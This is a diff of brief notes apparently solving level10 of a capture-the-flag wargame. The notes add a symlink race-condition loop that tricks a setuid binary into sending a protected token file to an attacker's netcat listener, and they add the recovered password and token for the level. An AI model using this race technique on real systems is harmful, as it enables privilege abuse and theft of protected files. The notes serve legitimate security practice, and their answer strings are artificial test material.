@@ -8,21 +8,23 @@ ltrace ->./level10 file host -> man acess
 strings ./level10 token 
 -> Connecting to %s:6969 
 
-    ifconfig
+    ifconfig -> 192.168.1.47(host)
     nc -lk 6969
 
-echo hello > /tmp/hello
-chmod 777 /tmp/hello
+echo hello > /tmp/file
+chmod 777 /tmp/file
 
     ->hello
 
 vim /tmp/main.c > main.c
-touch /tmp/file;
-chmod 777 /tmp/file
+# touch /tmp/file;
+# chmod 777 /tmp/file
 
-    ssh level10@192.168.56.101 -p 42
+    ssh level10@192.168.56.101 -p 4242
 
-# while true; do ./level10 token 92.168.1.47; done
-
+while true; do ln -fs ~/level10 /tmp/link; ln -fs ~/token /tmp/link; done
+while true; do ./level10 /tmp/link 192.168.1.47; done
+# while true; do ./level10 token 192.168.1.47; done
+pass: woupa2yuojeeaaed06riuj63c
 getflag
-token : 
+token : feulo4b72j7edeahuete3no7c
